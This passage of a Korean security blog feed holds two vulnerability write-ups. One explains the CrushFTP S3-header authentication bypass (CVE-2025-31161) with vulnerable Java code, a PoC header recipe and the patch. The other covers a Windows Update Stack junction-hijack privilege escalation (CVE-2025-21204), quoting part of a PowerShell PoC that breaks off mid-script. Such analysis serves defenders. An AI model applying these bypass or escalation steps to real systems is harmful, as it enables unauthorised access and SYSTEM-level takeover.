&#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; CVE-2025-2825&#xB97C; &#xBC1C;&#xAE09; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</em></p><p><em>&#xC774;&#xD6C4; 3&#xC6D4; 27&#xC77C; Mitre&#xB294; Vuluncheck&#xC0AC;&#xC5D0;&#xC11C; &#xBD80;&#xC5EC;&#xD55C; CVE-2025-2825&#xB294; Reject&#xD558;&#xACE0; CVE-2025-31161&#xB85C; &#xBD80;&#xC5EC;&#xB97C; &#xD558;&#xC5EC; <strong>&#xD604;&#xC7AC;&#xB294; CVE-2025-31161</strong>&#xB85C; &#xCD94;&#xC801;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</em></p></blockquote><p>CrushFTP&#xB294; AWS&#x202F;S3&#xC640; &#xD638;&#xD658;&#xB418;&#xB294; API&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; API&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xC778;&#xC99D; &#xAD00;&#xB828; &#xD50C;&#xB798;&#xADF8;&#xAC00;</strong> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529;&#xC73C;&#xB85C; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xB3FC; &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C; &#xD0C8;&#xCDE8; &#xBC0F; &#xD30C;&#xC77C; &#xD0C8;&#xCDE8;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>AWS S3 &#xC778;&#xC99D; &#xD5E4;&#xB354;</li></ul><pre><code class="hljs dts"><span class="hljs-symbol">Authorization:</span> AWS4-HMAC-SHA256 Credential=<span class="hljs-params">&lt;AccessKey&gt;</span>/<span class="hljs-params">&lt;Date&gt;</span>/<span class="hljs-params">&lt;Region&gt;</span><span class="hljs-meta-keyword">/s3/</span>aws4_request, SignedHeaders=<span class="hljs-params">&lt;Headers&gt;</span>, Signature=<span class="hljs-params">&lt;Signature&gt;</span></code></pre><p>AWS&#xC758; S3 API &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC740; Authorization &#xD5E4;&#xB354; &#xB0B4; Credential &#xD0A4;&#xC758; &#xAC12;&#xC778; AccessKey&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC2DD;&#xBCC4;&#xD55C; &#xB4A4; &#xD574;&#xB2F9; &#xAC12;&#xACFC; Signature&#xB97C; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xD558;&#xBA70; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. CrushFTP &#xAD6C;&#xD604;&#xC5D0;&#xC11C;&#xB294; <code>Credential=&lt;username&gt;[~password]/&#x2026;</code> &#xD615;&#xD0DC;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xBA70;, <code>&lt;username&gt;</code>&#xACFC; <code>~password</code>&#xB97C; &#xBD84;&#xB9AC;&#xD574; &#xB0B4;&#xBD80; &#xC778;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xCF54;&#xB4DC;-loginCheckHeaderAuth-&#xBA54;&#xC18C;&#xB4DC;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xCF54;&#xB4DC;-loginCheckHeaderAuth-&#xBA54;&#xC18C;&#xB4DC;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xCF54;&#xB4DC; (loginCheckHeaderAuth &#xBA54;&#xC18C;&#xB4DC;)"></a>&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xCF54;&#xB4DC; (loginCheckHeaderAuth &#xBA54;&#xC18C;&#xB4DC;)</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.headerLookup.containsKey(<span class="hljs-string">&quot;Authorization&quot;</span>.toUpperCase()) &amp;&amp;    <span class="hljs-keyword">this</span>.headerLookup.getProperty(<span class="hljs-string">&quot;Authorization&quot;</span>.toUpperCase()).trim().startsWith(<span class="hljs-string">&quot;AWS4-HMAC&quot;</span>)) {    String s3_username = <span class="hljs-keyword">this</span>.headerLookup.getProperty(<span class="hljs-string">&quot;Authorization&quot;</span>.toUpperCase()).trim();    String s3_username2 = s3_username.substring(s3_username.indexOf(<span class="hljs-string">&quot;=&quot;</span>) + <span class="hljs-number">1</span>);    String s3_username3 = s3_username2.substring(<span class="hljs-number">0</span>, s3_username2.indexOf(<span class="hljs-string">&quot;/&quot;</span>));    String user_pass = <span class="hljs-keyword">null</span>;    String user_name = s3_username3;    <span class="hljs-keyword">boolean</span> lookup_user_pass = <span class="hljs-keyword">true</span>; <span class="hljs-comment">//&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529; &#xC720;&#xBC1C; &#xD50C;&#xB798;&#xADF8;</span>    <span class="hljs-comment">// if&#xBB38;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; &#xD2B9;&#xC815; lookup_user_pass&#xB294; true&#xB85C; &#xC720;&#xC9C0;</span>    <span class="hljs-keyword">if</span> (s3_username3.indexOf(<span class="hljs-string">&quot;~&quot;</span>) &gt;= <span class="hljs-number">0</span>) {        user_pass = user_name.substring(user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>) + <span class="hljs-number">1</span>);        user_name = user_name.substring(<span class="hljs-number">0</span>, user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>));        lookup_user_pass = <span class="hljs-keyword">false</span>;    }<span class="hljs-comment">// lookup_user_pass&#xAC00; true&#xB85C; &#xC804;&#xB2EC;&#xB420; &#xACBD;&#xC6B0; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529; &#xBC1C;&#xC0DD;&#xB418;&#xBA70; &#xC778;&#xC99D;&#xC6B0;&#xD68C;</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.thisSession.login_user_pass(lookup_user_pass, <span class="hljs-keyword">false</span>, user_name, lookup_user_pass ? <span class="hljs-string">&quot;&quot;</span> : user_pass)) {    }}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; S3 &#xC2A4;&#xD0C0;&#xC77C;&#xC758; API &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC694;&#xCCAD;&#xC744; &#xD588;&#xC744; &#xB54C; &#xD5E4;&#xB354;&#xC758; Authorizion &#xD5E4;&#xB354;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC8FC;&#xC694; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294; &#xD50C;&#xB798;&#xADF8; <strong><code>lookup_user_pass</code></strong> </p><ul><li>true: &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xB0B4;&#xBD80; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; &#xC870;&#xD68C;</li><li>false: &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC870;&#xD68C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC804;&#xB2EC;&#xBC1B;&#xC740; AccessKey &#xAC12; &#xB0B4; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;</li></ul><p>Authorization &#xD5E4;&#xB354;&#xC758; Credential &#xD0A4;&#xC758; &#xAC12;(s3_username3 &#xBCC0;&#xC218;)&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; user_name, user_pass &#xD30C;&#xC2F1;</p><ul><li>Credential &#xD0A4; &#xAC12;(<acesskey>)&#xC5D0;&#xB294; {username~passwrod}&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, ~&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; if&#xBB38;&#xC744; &#xD0C0;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xBA70; <strong><code>lookup_user_pass</code></strong> &#xD50C;&#xB798;&#xADF8;&#xAC00; <strong><code>true</code></strong>&#xB85C; &#xC720;&#xC9C0;</acesskey></li></ul><p>login_user_pass &#xBA54;&#xC18C;&#xB4DC;&#xC5D0; lookup_user_pass &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC804;&#xB2EC;&#xB418;&#xC9C0;&#xB9CC; <strong>**login_user_pass &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; anyPass&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5B4; </strong><code>&#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC624;&#xBC84;&#xB85C;&#xB529;&#xC774; &#xBC1C;&#xC0DD;</code>**&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="login-user-pass-&#xBA54;&#xC18C;&#xB4DC;"><a href="#login-user-pass-&#xBA54;&#xC18C;&#xB4DC;" class="headerlink" title="login_user_pass &#xBA54;&#xC18C;&#xB4DC;"></a>login_user_pass &#xBA54;&#xC18C;&#xB4DC;</h3><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">login_user_pass</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> anyPass, <span class="hljs-keyword">boolean</span> doAfterLogin, String user_name, String user_pass)</span> <span class="hljs-keyword">throws</span> Exception </span>{                                                                                                                                <span class="hljs-number">2</span>     <span class="hljs-keyword">if</span> (user_name.length() &lt;= <span class="hljs-number">2000</span>) {        ...        <span class="hljs-keyword">int</span> length = user_pass.length();        ServerStatus serverStatus = ServerStatus.thisObj;        <span class="hljs-keyword">if</span> (length &lt;= ServerStatus.IG(<span class="hljs-string">&quot;max_password_length&quot;</span>) || user_name.startsWith(<span class="hljs-string">&quot;SSO_OIDC_&quot;</span>)) {            Log.log(<span class="hljs-string">&quot;LOGIN&quot;</span>, <span class="hljs-number">3</span>, <span class="hljs-keyword">new</span> Exception(String.valueOf(LOC.G(<span class="hljs-string">&quot;INFO:Logging in with user:&quot;</span>)) + user_name));            uiPUT(<span class="hljs-string">&quot;last_logged_command&quot;</span>, <span class="hljs-string">&quot;USER&quot;</span>);            ...<span class="hljs-comment">// &#xC778;&#xC99D; &#xB85C;&#xC9C1; (anyPass &#xD65C;&#xC131;&#xD654;&#xC2DC; &#xC6B0;&#xD68C;)</span>            <span class="hljs-keyword">boolean</span> verified = verify_user(user_name, verify_password, anyPass, doAfterLogin);            <span class="hljs-keyword">if</span> (verified &amp;&amp; <span class="hljs-keyword">this</span>.user != <span class="hljs-keyword">null</span>) {                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            }        }    }    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;}</code></pre><p>anyPass&#xB97C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; login_user_pass &#xBA54;&#xC18C;&#xB4DC;&#xB294; verify_user&#xC5D0; &#xD574;&#xB2F9; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="verify-user-&#xBA54;&#xC18C;&#xB4DC;-&#xC77C;&#xBD80;"><a href="#verify-user-&#xBA54;&#xC18C;&#xB4DC;-&#xC77C;&#xBD80;" class="headerlink" title="verify_user &#xBA54;&#xC18C;&#xB4DC; &#xC77C;&#xBD80;"></a>verify_user &#xBA54;&#xC18C;&#xB4DC; &#xC77C;&#xBD80;</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (anyPass &amp;&amp; user.getProperty(<span class="hljs-string">&quot;username&quot;</span>).equalsIgnoreCase(the_user)) {    <span class="hljs-keyword">return</span> user;}</code></pre><p>anyPass&#xAC00; &#xD65C;&#xC131;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC744; &#xACBD;&#xC6B0; &#xD2B9;&#xC815; username&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p><img src="/2025/04/19/empty/CVE-2025-31161/poc.png" alt="image.png"></p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD5E4;&#xB354;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xACBD;&#xB85C;: &amp;c2f={} // &#xCFE0;&#xD0A4; &#xD5E4;&#xB354;&#xAC12;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xAD6C;&#xC131;</li><li>Cookie&#xD5E4;&#xB354;: CrushAuth&#xD0A4; &#xAC12;&#xC744; {13&#xC790;&#xB9AC;<em>&#xB79C;&#xB364;&#xC22B;&#xC790;}</em>{30&#xC790;&#xB9AC;_&#xB79C;&#xB364;&#xAC12;}{c2f} &#xAD6C;&#xC131;</li><li>Authorization &#xD5E4;&#xB354;: AWS4-HMAC-SHA256 Credentail={username}/</li></ul><h3 id="&#xD328;&#xCE58;"><a href="#&#xD328;&#xCE58;" class="headerlink" title="&#xD328;&#xCE58;"></a>&#xD328;&#xCE58;</h3><p>&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>1) lookup_password &#xAE30;&#xB2A5; &#xBE44;&#xD65C;&#xC131;&#xD654;</p><pre><code class="hljs java"><span class="hljs-comment">// lookup_password &#xAE30;&#xB2A5;&#xC744; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xD558;&#xB294; &#xC124;&#xC815;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</span>default_settings.put(<span class="hljs-string">&quot;s3_auth_lookup_password_supported&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>);</code></pre><p>2) Authorization &#xD5E4;&#xB354; &#xB0B4; Credential &#xD0A4; &#xAC12; &#xAD6C;&#xC131; &#xAC80;&#xC99D;</p><pre><code class="hljs java"><span class="hljs-comment">// Authorization &#xD5E4;&#xB354;&#xC758; Credential &#xD0A4; &#xAC12;&#xC5D0; ~&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;</span><span class="hljs-keyword">if</span> (s3_username3.indexOf(<span class="hljs-string">&quot;~&quot;</span>) &gt;= <span class="hljs-number">0</span>) {    user_pass = user_name.substring(user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>) + <span class="hljs-number">1</span>);    user_name = user_name.substring(<span class="hljs-number">0</span>, user_name.indexOf(<span class="hljs-string">&quot;~&quot;</span>));    lookup_user_pass = <span class="hljs-keyword">false</span>;} <span class="hljs-keyword">else</span> {    ServerStatus serverStatus = ServerStatus.thisObj;    <span class="hljs-keyword">if</span> (!ServerStatus.BG(<span class="hljs-string">&quot;s3_auth_lookup_password_supported&quot;</span>)) {        <span class="hljs-keyword">return</span>;    }}</code></pre><p>3) &#xC778;&#xC99D; &#xB85C;&#xC9C1; &#xBCC0;&#xACBD;</p><pre><code class="hljs java">Properties tmp_user = UserTools.ut.getUser(<span class="hljs-keyword">this</span>.thisSession.server_item.getProperty(<span class="hljs-string">&quot;linkedServer&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), user_name);<span class="hljs-keyword">if</span> (tmp_user != <span class="hljs-keyword">null</span> &amp;&amp; lookup_user_pass) {    <span class="hljs-comment">// lookup_password &#xC218;&#xD589; (&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC870;&#xD68C;)</span>    user_pass = com.crushftp.client.Common.encryptDecrypt(tmp_user.getProperty(<span class="hljs-string">&quot;password&quot;</span>), <span class="hljs-keyword">false</span>);}<span class="hljs-keyword">if</span> (tmp_user != <span class="hljs-keyword">null</span> &amp;&amp; user_pass != <span class="hljs-keyword">null</span>) {    <span class="hljs-comment">// &#xC544;&#xC774;&#xB514;/&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xAC80;&#xC99D; &#xC218;&#xD589;</span>}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Authentication-Bypass/">Authentication Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/empty/">empty</category>
      
      <category domain="https://hackyboiz.github.io/tags/CrushFTP/">CrushFTP</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/19/empty/CVE-2025-31161/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-21204: Windows Update Stack의 Improper Link Following으로 인한 Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2025/04/17/pwndorei/2025-04-17/</link>
      <guid>https://hackyboiz.github.io/2025/04/17/pwndorei/2025-04-17/</guid>
      <pubDate>Thu, 17 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cyberdom.blog/abusing-the-windows-update-stack-to</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cyberdom.blog/abusing-the-windows-update-stack-to-gain-system-access-cve-2025-21204/">https://cyberdom.blog/abusing-the-windows-update-stack-to-gain-system-access-cve-2025-21204/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 4&#xC6D4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xC804;&#xC758; Update Stack&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Windows<ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21204/">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21204/</a></li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-21204&#xB294; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; <code>MoUsoCoreWorker.exe</code>&#xC640; <code>UsoClient.exe</code> &#xAC19;&#xC740; SYSTEM &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC5D0; &#xC758;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC758;&#xD574; <code>C:\ProgramData\Microsoft\UpdateStack\Tasks</code> &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB098; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xB370; &#xC774;&#xB54C; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD3F4;&#xB354;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC704;&#xCE58;&#xD55C; &#xD3F4;&#xB354;&#xC758; &#xC815;&#xC158;&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xD560; &#xC218; &#xC788;&#xACE0; &#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;&#xC5D0; &#xD30C;&#xC6CC;&#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xB4F1;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC704;&#xCE58;&#xC2DC;&#xD0A8;&#xB2E4;.</li><li><code>C:\ProgramData\Microsoft\UpdateStack\Tasks</code>&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; 1.&#xC5D0;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xACBD;&#xB85C;&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xC815;&#xC158;&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xD55C;&#xB2E4;.</li><li>&#xC608;&#xC57D;&#xB41C; &#xC791;&#xC5C5;&#xC5D0; &#xC758;&#xD574; &#xD639;&#xC740; &#xC9C1;&#xC811; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD574;&#xC11C; <code>UsoClient.exe</code>, <code>MoUsoCoreWorker.exe</code>, <code>TiWorker.exe</code>&#xC640; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</li><li>&#xC0DD;&#xC131;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4;&#xB2E4;.</li></ol><p>&#xC544;&#xB798;&#xB294; &#xC774;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294; &#xD30C;&#xC6CC;&#xC258;&#xB85C; &#xC791;&#xC131;&#xB41C; <a href="https://raw.githubusercontent.com/eshlomo1/CloudSec/refs/heads/main/Attacking%20the%20Cloud/CVE-2025-21204/Exploit-CVE2025-UpdateStackLPE-NonAdmin.ps1">PoC</a>&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC74C;&#xC744; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-comment">&lt;#</span><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span></span><span class="hljs-comment">    CVE-2025-21204 exploit simulation for non-admin users via junction-based path hijack.</span><span class="hljs-comment"></span><span class="hljs-comment"><span class="hljs-doctag">.DESCRIPTION</span></span><span class="hljs-comment">    Drops a bait payload in a user-controlled directory, creates a junction to hijack the Update Stack path,</span><span class="hljs-comment">    and triggers the update process to test if SYSTEM accesses the payload.</span><span class="hljs-comment">    The script provide the poc that allows to run this actions. </span><span class="hljs-comment"></span><span class="hljs-comment">.AUTHOR</span><span class="hljs-comment">    Elli Shlomo</span><span class="hljs-comment"></span><span class="hljs-comment">#&gt;</span><span class="hljs-comment"># Paths</span><span class="hljs-variable">$trapPath</span>      = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\Microsoft\UpdateStack\Tasks&quot;</span><span class="hljs-variable">$updateStackRealPath</span> = <span class="hljs-string">&quot;C:\ProgramData\Microsoft\UpdateStack\Tasks&quot;</span><span class="hljs-variable">$payloadPath</span>   = <span class="hljs-string">&quot;<span class="hljs-variable">$trapPath</span>\UpdateStackAgent.dll&quot;</span><span class="hljs-variable">$proofPath</span>     = <span class="hljs-string">&quot;C:\Users\Public\cve2025-proof.log&quot;</span><span class="hljs-variable">$logPath</span>       = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\CVE2025\simulation.log&quot;</span><span class="hljs-variable">$evidencePath</span>  = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\CVE2025\evidence.txt&quot;</span><span class="hljs-variable">$verdictPath</span>   = <span class="hljs-string">&quot;<span class="hljs-variable">$env:APPDATA</span>\CVE2025\vulnerable.txt&quot;</span><span class="hljs-variable">$verboseLog</span>    = <span class="hljs-string">&quot;<span class="hljs-variable">$env:TEMP</span>\cve2025-verbose.log&quot;</span><span class="hljs-comment"># Intro</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;`n[*] CVE-2025-21204 Exploit Simulation (Non-Admin)&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Trap directory       : <span class="hljs-variable">$trapPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Payload DLL path     : <span class="hljs-variable">$payloadPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] SYSTEM proof file    : <span class="hljs-variable">$proofPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Simulation log       : <span class="hljs-variable">$logPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Evidence file        : <span class="hljs-variable">$evidencePath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Verdict result       : <span class="hljs-variable">$verdictPath</span>&quot;</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Verbose transcript   : <span class="hljs-variable">$verboseLog</span>`n&quot;</span><span class="hljs-comment"># Start transcript</span><span class="hljs-built_in">Start-Transcript</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$verboseLog</span> <span class="hljs-literal">-Force</span><span class="hljs-comment"># Ensure directories exist</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Creating necessary directories...&quot;</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$trapPath</span> <span class="hljs-literal">-ItemType</span> Directory <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> (<span class="hljs-built_in">Split-Path</span> <span class="hljs-variable">$logPath</span>) <span class="hljs-literal">-ItemType</span> Directory <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[+] Directories 